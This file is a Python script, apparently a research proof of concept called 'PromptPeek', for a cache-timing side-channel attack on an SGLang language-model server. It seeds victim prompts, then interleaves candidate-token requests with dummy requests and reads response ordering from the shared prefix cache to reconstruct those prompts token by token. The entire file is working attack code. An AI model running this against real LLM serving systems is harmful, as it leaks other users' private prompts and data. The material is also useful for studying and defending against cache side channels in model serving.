import asyncio
import json
import logging
import sys
from typing import List, Tuple

import httpx
import requests
import torch
from transformers import AutoTokenizer
from transformers.models import LlamaForCausalLM

MODEL_NAME_OR_PATH = "/home/marcorentap/.cache/huggingface/hub/models--meta-llama--Llama-3.2-1B-Instruct/snapshots/9213176726f574b556790deb65791e0c5aa438b6"
SGLANG_SERVER = "http://localhost:30000"
CANDIDATES_SIZE = 32
DUMMIES_SIZE = 32
MAX_TOKENS = 128
TEMPERATURE = 0

# How many post dummies until candidates are considered wrong
# Should be approximately equal to running batch size
# Too large -> false positive, Too small -> false negative
POST_DUMMY_THRESHOLD = 16

# How many candidate batches to try until giving up. Set to 0 to never give up (try all possible tokens)
MAX_CANDIDATE_BATCHES = 5

model = LlamaForCausalLM.from_pretrained(MODEL_NAME_OR_PATH)
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME_OR_PATH)
client = httpx.AsyncClient(timeout=120)


# All tokens except the least likely, sorted by probability
def gen_candidates(prefix: List[int]) -> List[int]:
    input_ids = torch.tensor([prefix])  # batch of size 1
    attention_mask = torch.ones_like(input_ids)

    outputs = model(input_ids=input_ids, attention_mask=attention_mask)
    logits = outputs.logits

    last_token_logits = logits[0, -1, :]

    topk = torch.topk(last_token_logits, k=len(last_token_logits) - 1)
    top_indices = topk.indices
    candidates = top_indices.tolist()

    return candidates[:-1]


# Least likely token
def gen_dummy(prefix: List[int]) -> int:
    input_ids = torch.tensor([prefix])  # batch of size 1
    attention_mask = torch.ones_like(input_ids)

    outputs = model(input_ids=input_ids, attention_mask=attention_mask)
    logits = outputs.logits

    last_token_logits = logits[0, -1, :]

    bottomk = torch.topk(last_token_logits, k=1, largest=False)
    bottom_indices = bottomk.indices
    dummies = bottom_indices.tolist()

    return dummies[0]


async def send_request(toks: List[int], req_id: str):
    delay = 0
    return await client.post(
        f"{SGLANG_SERVER}/generate",
        json={
            "input_ids": toks,
            "rid": req_id,
            "sampling_params": {
                "temperature": TEMPERATURE,
                "max_new_tokens": MAX_TOKENS,
            },
        },
        headers={
            "PromptPeek-Request-Id": req_id,
            "PromptPeek-Delay": str(delay),
        },
    )


async def peek_one(prefix: List[int]) -> List[List[int]]:
    cand_toks = gen_candidates(prefix)
    dummy_tok = gen_dummy(prefix)

    batch_size = CANDIDATES_SIZE
    num_batches = (len(cand_toks) + batch_size - 1) // batch_size

    for try_i in range(num_batches):
        if MAX_CANDIDATE_BATCHES != 0 and try_i > MAX_CANDIDATE_BATCHES - 1:
            print(f"Reached max candidate batches ({MAX_CANDIDATE_BATCHES})")
            break

        # Select batch of candidate tokens
        batch_cand_toks = cand_toks[try_i * batch_size : (try_i + 1) * batch_size]
        batch_candidates = [prefix + [tok, tok] for tok in batch_cand_toks]
        dummies = [prefix + [dummy_tok, dummy_tok] for _ in range(DUMMIES_SIZE)]

        print("Dummy: ", bytes(tokenizer.decode(dummy_tok), encoding="utf-8"))
        print(
            f"Candidates (batch {try_i + 1}/{num_batches}):",
            tokenizer.batch_decode(batch_cand_toks),
        )

        tasks = []
        # Pre-dummy
        for i, pre_dummy in enumerate(dummies):
            tasks.append(asyncio.create_task(send_request(pre_dummy, f"pre_dummy_{i}")))
        await asyncio.sleep(0.2)

        # Candidates (for this batch only)
        for i, cand in enumerate(batch_candidates):
            tasks.append(
                asyncio.create_task(
                    send_request(cand, f"candidate_{try_i * batch_size + i}")
                )
            )
        await asyncio.sleep(0.2)

        # Post-dummy
        for i, post_dummy in enumerate(dummies):
            tasks.append(
                asyncio.create_task(send_request(post_dummy, f"post_dummy_{i}"))
            )
        await asyncio.sleep(0.2)

        response_order = []
        for task in asyncio.as_completed(tasks):
            res = await task
            body = res.json()
            e2e_latency = body["meta_info"]["e2e_latency"]
            req_id = res.request.headers["PromptPeek-Request-Id"]
            response_order.append({"id": req_id, "e2e_latency": e2e_latency})

        n_post_dummies = 0
        next_prefixes = []
        for res in response_order:
            if res["id"].startswith("post_dummy"):
                n_post_dummies += 1
            if n_post_dummies >= POST_DUMMY_THRESHOLD:
                break
            if res["id"].startswith("candidate"):
                idx = int(res["id"].split("_")[-1])
                # Compute the candidate tok corresponding to idx
                # Since batch_candidates aligns to batch_cand_toks, and all are flat-indexed by idx
                cand_tok = cand_toks[idx]
                next_prefix = prefix + [cand_tok]
                next_prefixes.append(next_prefix)

        if next_prefixes:
            return next_prefixes

    return []


async def main():
    input = json.load(open("input.json"))
    victims = input["victims"]
    known_prefixes = input["prefixes"]

    victim_toks = [tokenizer.encode(victim) for victim in victims]
    known_prefix_toks = [
        tokenizer.encode(known_prefix) for known_prefix in known_prefixes
    ]

    # Flush Cache
    requests.post(SGLANG_SERVER + "/flush_cache")

    # Victim
    for i, victim_tok in enumerate(victim_toks):
        await send_request(victim_tok, f"victim_{i}")

    found_victim_count = 0
    for known_prefix in known_prefix_toks:
        found_victims = []
        prefixes = [known_prefix]
        while len(prefixes) > 0:
            prefix = prefixes.pop(0)
            print()
            print("Trying:", tokenizer.decode(prefix))

            # Find victim with most matching prefix
            closest_victim_toks = []
            max_match_len = 0
            had_comparison = False
            for v in victim_toks:
                if v in found_victims:
                    continue
                had_comparison = True
                common = 0
                for a, b in zip(prefix, v):
                    if a == b:
                        common += 1
                    else:
                        break
                if common > max_match_len:
                    max_match_len = common
                    closest_victim_toks = v

            # If no victims left, go to next known prefix
            if not had_comparison or max_match_len < len(prefix) / 2:
                print("No matching victim")
                break

            print("Closest victim:", tokenizer.decode(closest_victim_toks))

            # Compare the length with most matching victim
            if len(prefix) >= len(closest_victim_toks):
                found_victims.append(prefix)
                print("Found victim:", tokenizer.decode(closest_victim_toks))
                found_victim_count += 1
                continue

            next_prefixes = await peek_one(prefix)
            prefixes.extend(next_prefixes)

    print(f"Found {found_victim_count}/{len(victims)} victims")


if __name__ == "__main__":
    asyncio.run(main())
